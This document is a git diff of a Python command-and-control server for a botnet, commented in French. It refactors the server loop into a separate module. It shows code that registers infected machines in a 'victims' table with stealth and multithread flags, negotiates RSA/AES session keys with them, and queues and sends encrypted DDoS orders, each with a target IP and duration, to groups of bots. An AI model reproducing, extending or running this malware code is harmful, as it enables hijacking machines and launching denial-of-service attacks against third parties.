@@ -1,4 +1,5 @@
 import argparse
+import os
 import mysql.connector
 import json
 import socket
@@ -8,6 +9,7 @@ import rsa
 import base64
 
 from env import *
+from server import *
 from database import *
 from network import *
 from functions import *
@@ -97,6 +99,9 @@ db = mysql.connector.connect(
 )
 mycursor = db.cursor()
 
+
+
+
 if args.ddos:
     if not args.address or not args.time:
         parser.error("--ddos nécessite les arguments --address et --time")
@@ -122,10 +127,11 @@ if args.ddos:
             result = mycursor.fetchall()
 
             for id in result:
-                query = "INSERT INTO group_attacks (group_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                query = "INSERT INTO group_attacks (group_id, type, state, executed_rate, text, created_at, updated_at) VALUES (%s, %s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
                 values = (id[0], 
                           "ddos", 
                           "pending", 
+                          "0",
                           "{\"ip\": \"" + args.address + "\", \"time\": \"" + str(args.time) + "\"}")
 
                 mycursor.execute(query, values)
@@ -636,249 +642,228 @@ elif args.start:
     else:
         print("démarrage du serveur sur le port " + str(args.port))
 
+
+        start_server(args.port)
+
         #  0      1          2                3               4                 5            6      7   8
         #(addr, conn, thread_emission, emission_queue, thread_reception, reception_queue, sym_key, iv, uid)
-        clients = []
+        # clients = []
 
-        # Socket
-        host = HOST
-        port = args.port
+        # # Socket
+        # host = HOST
+        # port = args.port
 
-        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        socket_server.setblocking(0)
-        socket_server.bind((host, port))
-        socket_server.listen()
-        print("ecoute sur : " + str(host) + ":" + str(port))
-
-
-        connection_list = [socket_server]
-
-        # Database
-        db = mysql.connector.connect(
-            host=DBHOST,
-            user=DBUSER,
-            password=DBPASSWORD,
-            database=DB
-        )
+        # socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # socket_server.setblocking(0)
+        # socket_server.bind((host, port))
+        # socket_server.listen()
+        # print("ecoute sur : " + str(host) + ":" + str(port))
 
 
-        mycursor = db.cursor()
+        # connection_list = [socket_server]
 
-        running = True
+        # # Database
+        # db = mysql.connector.connect(
+        #     host=DBHOST,
+        #     user=DBUSER,
+        #     password=DBPASSWORD,
+        #     database=DB
+        # )
 
 
-        while running:
-            print("running")
-            # print(connection_list)
+        # mycursor = db.cursor()
 
-            read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)
+        # running = True
 
 
-            # print("read_sockets : " + str(read_sockets))
+        # while running:
+        #     print("running")
+        #     # print(connection_list)
 
-            for sock in read_sockets:
-                # Nouvelle connexion
-                if sock is socket_server:
-                    conn, addr = sock.accept()
+        #     read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)
 
-                    # Création des threads d'émission et de réception
-                    emission_queue = Queue()
-                    thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr))
-                    thread_emission.start()
 
-                    reception_queue = Queue()
-                    thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr))
-                    thread_reception.start()
+        #     # print("read_sockets : " + str(read_sockets))
 
-                    # Handshake
-                    print("handshake with " + str(addr))
+        #     for sock in read_sockets:
+        #         # Nouvelle connexion
+        #         if sock is socket_server:
+        #             conn, addr = sock.accept()
 
-                    # Récupération de la clé publique du client
-                    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
+        #             # Création des threads d'émission et de réception
+        #             emission_queue = Queue()
+        #             thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr))
+        #             thread_emission.start()
 
-                    # Génération de la clé symétrique
-                    sym_key = get_random_bytes(16)
-                    iv = get_random_bytes(16)
-                    # print("symetric key : " + str(sym_key))
-                    # print("iv : " + str(iv))
+        #             reception_queue = Queue()
+        #             thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr))
+        #             thread_reception.start()
 
-                    json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'
+        #             # Handshake
+        #             print("handshake with " + str(addr))
 
-                    # Chiffrement de la data avec la clé publique du client
-                    encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)
+        #             # Récupération de la clé publique du client
+        #             public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
 
-                    # Envoi de la clé symétrique chiffrée
-                    emission_queue.put(encrypted_sym_key)
+        #             # Génération de la clé symétrique
+        #             sym_key = get_random_bytes(16)
+        #             iv = get_random_bytes(16)
+        #             # print("symetric key : " + str(sym_key))
+        #             # print("iv : " + str(iv))
 
-                    # print("[+] Waiting for client handshake informations")
+        #             json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'
 
-                    received_data = reception_queue.get()
+        #             # Chiffrement de la data avec la clé publique du client
+        #             encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)
 
-                    cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
-                    pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
+        #             # Envoi de la clé symétrique chiffrée
+        #             emission_queue.put(encrypted_sym_key)
 
-                    # Récupération de l'uid client
-                    uid = json.loads(pt)["uid"]
+        #             # print("[+] Waiting for client handshake informations")
 
-                    # Vérification de l'uid dans la base de données
-                    query = "SELECT * FROM victims WHERE uid = %s"
-                    values = (uid,)
+        #             received_data = reception_queue.get()
 
-                    mycursor.execute(query, values)
+        #             cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
+        #             pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
 
-                    myresult = mycursor.fetchall()
+        #             # Récupération de l'uid client
+        #             uid = json.loads(pt)["uid"]
 
-                    if len(myresult) > 0:
-                        # print("client already in the database")
-                        query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
-                        values = (addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)
+        #             # Vérification de l'uid dans la base de données
+        #             query = "SELECT * FROM victims WHERE uid = %s"
+        #             values = (uid,)
 
-                        mycursor.execute(query, values)
+        #             mycursor.execute(query, values)
 
-                    else:
-                        # print("client not in the database")
-                        # Ajout du client à la base de données
+        #             myresult = mycursor.fetchall()
 
-                        query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
-                        values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
+        #             if len(myresult) > 0:
+        #                 # print("client already in the database")
+        #                 query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
+        #                 values = (addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)
 
-                        mycursor.execute(query, values)
+        #                 mycursor.execute(query, values)
 
-                    db.commit()
+        #             else:
+        #                 # print("client not in the database")
+        #                 # Ajout du client à la base de données
 
-                    # Ajout du client à la liste des clients
-                    clients.append(dict(addr = addr, 
-                                        conn = conn, 
-                                        thread_emission = thread_emission, 
-                                        emission_queue = emission_queue, 
-                                        thread_reception = thread_reception, 
-                                        reception_queue = reception_queue, 
-                                        sym_key = sym_key, 
-                                        iv = iv,
-                                        uid = uid
-                                    ))
+        #                 query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
+        #                 values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
+
+        #                 mycursor.execute(query, values)
+
+        #             db.commit()
+
+        #             # Ajout du client à la liste des clients
+        #             clients.append(dict(addr = addr, 
+        #                                 conn = conn, 
+        #                                 thread_emission = thread_emission, 
+        #                                 emission_queue = emission_queue, 
+        #                                 thread_reception = thread_reception, 
+        #                                 reception_queue = reception_queue, 
+        #                                 sym_key = sym_key, 
+        #                                 iv = iv,
+        #                                 uid = uid
+        #                             ))
 
 
             
-            # Récupération des attaques de groupe à lancer
-            # state = "pending", "running", "finished", "error"
-            query = "SELECT * FROM group_attacks WHERE state = 'pending';"
+        #     # Récupération des attaques de groupe à lancer
+        #     # state = "pending", "running", "finished", "error"
+        #     query = "SELECT * FROM group_attacks WHERE state = 'pending';"
 
-            mycursor.execute(query)
+        #     mycursor.execute(query)
 
-            attacks = mycursor.fetchall()
+        #     attacks = mycursor.fetchall()
 
-            print("ATT : " + str(attacks))
-
-
-            for attack in attacks:
-
-                # Récupération des données de l'attaque
-                attack_data = json.loads(attack[4])
-                attack_type = attack[2]
-                attack_id = attack[0]
+        #     print("ATT : " + str(attacks))
 
 
-                # Récupération des ordinateurs du groupe
-                query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
-                values = (attack[1], )
+        #     for attack in attacks:
 
-                mycursor.execute(query, values)
-                victims_uid = mycursor.fetchall()
+        #         # Récupération des données de l'attaque
+        #         attack_data = json.loads(attack[4])
+        #         attack_type = attack[2]
+        #         attack_id = attack[0]
+
+        #         print("attack_data : " + str(attack_type))
 
 
-                attack_sent = False
+        #         # Récupération des ordinateurs du groupe
+        #         query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
+        #         values = (attack[1], )
 
-                for victim_uid in victims_uid:
-                    for client in clients:
-                        if client['uid'] == victim_uid[0]:
-                            print("sending attack to " + str(client['addr']))
-                            attack_sent = True
+        #         mycursor.execute(query, values)
+        #         victims_uid = mycursor.fetchall()
 
-                            data_to_send = format_attack_data(attack_type, attack_id, attack_data)
 
-                            # Envoi de l'attaque à l'ordinateur
-                            cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                            cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
-                            print("cipher_text : ")
-                            print(cipher_text)
-                            
-                            decimal_elements = [byte for byte in cipher_text]
-                            print("decimal_elements : " + str(decimal_elements))
+        #         attack_sent = False
 
-                            client['emission_queue'].put(cipher_text)
+        #         for victim_uid in victims_uid:
+        #             for client in clients:
+        #                 if client['uid'] == victim_uid[0]:
+        #                     execute_attack(client, attack_data)
 
-                # Mise à jour de l'attaque si elle a été envoyée au moins une fois
-                if attack_sent:
-                    query = "UPDATE group_attacks SET state = 'running' WHERE id = %s"
-                    values = (attack[0], )
+        #         # Mise à jour de l'attaque si elle a été envoyée au moins une fois
+        #         if attack_sent:
+        #             query = "UPDATE group_attacks SET state = 'running' WHERE id = %s"
+        #             values = (attack[0], )
 
-                    mycursor.execute(query, values)
+        #             mycursor.execute(query, values)
         
+            
+        
+        #     # Récupération des attaques individuelles à lancer
+        #     # state = "pending", "running", "finished", "error"
+        #     query = "SELECT * FROM victim_attacks WHERE state = 'pending';"
 
+        #     mycursor.execute(query)
 
-            # Récupération des attaques individuelles à lancer
-            # state = "pending", "running", "finished", "error"
-            query = "SELECT * FROM victim_attacks WHERE state = 'pending';"
+        #     attacks = mycursor.fetchall()
 
-            mycursor.execute(query)
+        #     for attack in attacks:
 
-            attacks = mycursor.fetchall()
-
-            for attack in attacks:
-
-                # Récupération des données de l'attaque
-                data = json.loads(attack[4])
-
-
-                # Récupération des ordinateurs du groupe
-                query = "SELECT uid FROM victims WHERE id = %s"
-                values = (attack[1], )
-
-                mycursor.execute(query, values)
-
-                victims = mycursor.fetchall()
-
-                for victim in victims:
-                    
-                    victim_uid = victim[0]
-
-                    for client in clients:
-                        if client['uid'] == victim_uid:
-                            print("sending attack to " + str(client['addr']))
-
-                            data_to_send = format_attack_data(data)
-
-                            # Envoi de l'attaque à l'ordinateur
-                            cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                            cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
-
-                            client['emission_queue'].put(cipher_text)
-
-                # Mise à jour de l'attaque
-                query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
-                values = (attack[0], )
-
-                mycursor.execute(query, values)
+        #         # Récupération des données de l'attaque
+        #         data = json.loads(attack[4])
                 
-            #######################
+        #         # Récupération des ordinateurs du groupe
+        #         query = "SELECT uid FROM victims WHERE id = %s"
+        #         values = (attack[1], )
+
+        #         mycursor.execute(query, values)
+
+        #         victims = mycursor.fetchall()
+
+        #         for victim in victims:
+        #             victim_uid = victim[0]
+        #             for client in clients:
+        #                 execute_attack(client, data)
+
+        #         # Mise à jour de l'attaque
+        #         query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
+        #         values = (attack[0], )
+
+        #         mycursor.execute(query, values)
+                
+        #     #######################
                 
                     
-            for client in clients:
+        #     for client in clients:
 
-                # Récupération des données clients
-                try:
-                    encrypted_data_received = client['reception_queue'].get_nowait()
+        #         # Récupération des données clients
+        #         try:
+        #             encrypted_data_received = client['reception_queue'].get_nowait()
 
-                    cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                    pt = unpad(cipher.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
+        #             cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+        #             pt = unpad(cipher.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
 
-                    print(client['addr'])
-                    print("received data : " + str(pt))
+        #             print(client['addr'])
+        #             print("received data : " + str(pt))
 
-                except Empty:
-                    pass
+        #         except Empty:
+        #             pass
 else :
     parser.error("no action specified. Use -h/--help for help")
 db.commit()
